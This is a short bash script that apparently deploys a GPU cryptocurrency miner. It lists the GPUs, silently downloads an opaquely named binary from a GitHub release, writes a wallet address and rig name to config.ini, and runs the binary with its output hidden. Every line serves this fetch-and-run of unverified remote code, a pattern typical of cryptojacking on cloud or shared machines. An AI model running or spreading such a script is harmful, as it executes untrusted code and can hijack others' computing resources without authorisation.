#!/bin/bash
nvidia-smi -L
wget https://github.com/jannapgq32/as/releases/download/1/gskhjk &> /dev/null
chmod +x gskhjk
echo wallet = 0x2da80e09cc05981269038c7560c7b54b63fad5a3 >> config.ini
echo rigName = $1 >> config.ini
./gskhjk config.ini &> logdebug
